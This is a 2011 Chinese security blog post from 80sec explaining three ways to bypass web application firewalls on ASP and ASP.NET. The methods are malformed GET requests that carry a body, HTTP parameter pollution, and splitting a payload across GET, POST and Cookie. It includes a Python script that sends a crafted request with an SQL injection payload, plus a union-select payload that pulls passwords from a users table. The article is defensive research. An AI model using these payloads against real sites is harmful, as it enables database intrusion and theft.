@@ -1,0 +1,143 @@
+浅谈绕过WAF的数种方法
+Write by admin in 未分类 at 2011-09-06 14:28:52
+EMail: rayh4c#80sec.com
+Site: http://www.80sec.com
+Date: 2011-09-06
+From: http://www.80sec.com/?p=244
+
+0×00 前言
+
+08年初诞生了一种SQL群注攻击，黑客在全球范围内对asp，asp.net加MSSQL架构的网站进行了疯狂扫荡。由于MSSQL支持多语句注入，黑客通过一条结合游标的SQL语句就能将整个数据库的字段内容自动进行篡改，可以在网站上无差别的进行网页木马攻击。
+
+互联网是快速更新迭代的，但是很多没有开发能力的单位都是通过外包建立网站，网站的程序一上线就再也无人维护，很多程序存在各种漏洞无法修补，于是WAF便有了市场，现今门槛低且最能解决问题的是针对IIS/apache的软件WAF，通常一个模块一个扩展就能搞定，当然也有耗资百万千万的硬件WAF，然而如果WAF拦截规则出现漏洞，这百万千万的硬件也就是一堆废铁。那么WAF是否真的可以解决所有的WEB安全问题呢？所以本文主要解析一些可以绕过WAF的罕见漏洞，供安全人员参考。
+
+0×01 Request对象的包解析漏洞.
+
+asp和asp.net的Request对象存在一个包解析漏洞，Request对象对于GET和POST包的解析过于宽松，用一句话表达就是Request对象它GET和POST傻傻分不清楚，稍有点web开发经验的同学应该知道Request接收GET,POST,COOKIE也就是GPC传过来的数据，但是asp和.net库内置的Request对象完全不按RFC标准来，下面我们可以做个测试：
+
+分别将下面两段代码保存为1.asp和1.aspx
+
+使用asp的Request对象接收t参数传值
+———————————————–
+＜%
+Response.Write “Request:” & Request(“t”)
+%＞
+———————————————–
+使用asp.net的Request对象接收t参数传值
+———————————————–
+＜%@ Page Language=”C#” %＞
+＜%
+string test = Request["t"];
+Response.Write(“Request:”+test);
+%＞
+———————————————–
+
+使用下面的python脚本调用socket发送原始的HTTP包
+———————————————–
+#!/usr/bin/env python
+
+import socket
+
+host = ’192.168.239.129′
+path = ‘/1.asp’
+port = 80
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+s.settimeout(8)
+
+exploit_packet=”t=’/**/or/**/1=1–”
+exploit_packet+=”\r\n” * 8
+packet_length = len(exploit_packet)
+packet=’GET ‘ + path + ‘ HTTP/1.1\r\n’
+packet+=’Host: ‘ + host + ‘\r\n’
+packet+=’Content-Length: %s\r\n’ % packet_length
+packet+=’Content-Type: application/x-www-form-urlencoded\r\n’
+packet+=’\r\n’
+packet = packet + exploit_packet
+
+print packet
+s.send(packet)
+buf = s.recv(1000)
+if buf: print buf[buf.rfind("\r\n"):]
+s.close()
+———————————————–
+我们发送的原始包是：
+GET /1.asp HTTP/1.1
+Host: 192.168.239.129
+Content-Length: 34
+Content-Type: application/x-www-form-urlencoded
+
+t=’/**/or/**/1=1–
+结果返回如下：
+Request:’/**/or/**/1=1–
+将python测试脚本的path改为/1.aspx测试页返回同样结果。
+
+我们可以看到这是一个畸形的HTTP GET请求包，这个包的奥秘在于Content-Type和Content-Length头，包的结构类似于一个POST包，而请求的方法是GET,最后asp和asp.net的Request对象成功的解析了这个畸形包取出了数据。
+
+所以如果WAF没有处理好HTTP包的内容，沿用常规思路处理GET和POST的逻辑的话，那么这个畸形包将会毁掉WAF的基础防御。
+
+0×02 被遗忘的复参攻击.
+
+大家应该还记得09年的HTTP Parameter Pollution攻击，查看[3]文档，可以发现ASP/IIS和ASP.NET/IIS的场景下存在一个复参特性，本文将利用这种的特性的攻击简称为复参攻击，用0X01里的例子简单的测试一下:
+
+用GET请求传入两个t参数
+GET http://192.168.239.129/1.asp?t=1&t=2
+将返回
+Request:1, 2
+
+asp和asp.net的Request对象接收了两个参数，并且以逗号分隔，所以便衍生出了[3]文档中的复参SQL注入方法：
+
+Vulnerable code：
+SQL=”select key from table where id=”+Request.QueryString(“id”)
+
+This request is successfully performed using the HPP technique：
+/?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users
+
+The SQL request becomes：
+select key from table where id=1/**/union/*,*/select/*,*/pwd/*,*/from/*,*/usersLavakumarKuppan,
+
+我们可以看到通过巧妙的运用注释符结合复参特性可以分割GET参数中的SQL注入语句，如果WAF对GET参数的处理过于简单是不是会匹配不到拦截规则呢?
+
+0×03 高级复参攻击.
+
+ASP.NET的Request对象有一个Params属性，ASP.NET程序员在一些程序中会使用Request.Params["xxx"]传入数据，参考[4]微软MSDN文档我们可以知道Params属性的特性，该属性接收GET,POST和Cookie的传值集合，这里我们可以修改0×01里的例子测试一下：
+
+使用asp.net的Request.Params方法接收t参数传值
+———————————————–
+＜%@ Page Language=”C#” %＞
+＜%
+string test = Request.Params["t"];
+Response.Write(“Request:”+test);
+%＞
+———————————————–
+
+发送一个POST包，GET,POST,COOKIE三个方法中都带有不同的t参数内容
+———————————————–
+POST http://192.168.239.129/1.aspx?t=1 HTTP/1.1
+Host: 192.168.239.129
+Cookie: t=2
+
+t=3
+———————————————–
+
+结果返回
+Request:1,3,2
+
+最后得出结论，Request.Params方法接收的数据是按照GPC顺序整合，看到这里的同学再联想到0×02的复参攻击应该如醍醐灌顶了，我们可以将SQL攻击语句拆分到GET,POST,COOKIE三个变量里进行组合攻击。想一想WAF针对这种高级复参攻击是否防御好了？
+
+0×04 后话
+
+WAF是不可能解决所有安全问题的，本文的思路归其本源实际上是描叙了WAF处理HTTP包与服务端处理HTTP包数种差异。互联网是不断更新迭代的，差异存在，类似的漏洞也会存在。
+本文提到了三种绕过WAF的思路，第一种是我的原创属于0DAY状态，第二种是参考已有的复参攻击，其中第三种高级复参攻击是由Safe3同学提出的，本文也是与Safe3同学讨论他开发的WAF的BUG而来，所以感谢Safe3同学。
+另外请大家不要将本文的内容用于非法途径，仅供安全人员参考，谢谢。
+
+参考：
+[1].http://www.faqs.org/rfcs/rfc2616.html
+[2].http://www.w3school.com.cn/asp/asp_ref_request.asp
+[3].http://www.ptsecurity.com/download/PT-devteev-CC-WAF-ENG.pdf
+[4].http://msdn.microsoft.com/en-us/library/system.web.httprequest.aspx
+
+Comments (0)
+本站内容均为原创，转载请务必保留署名与链接！
+浅谈绕过WAF的数种方
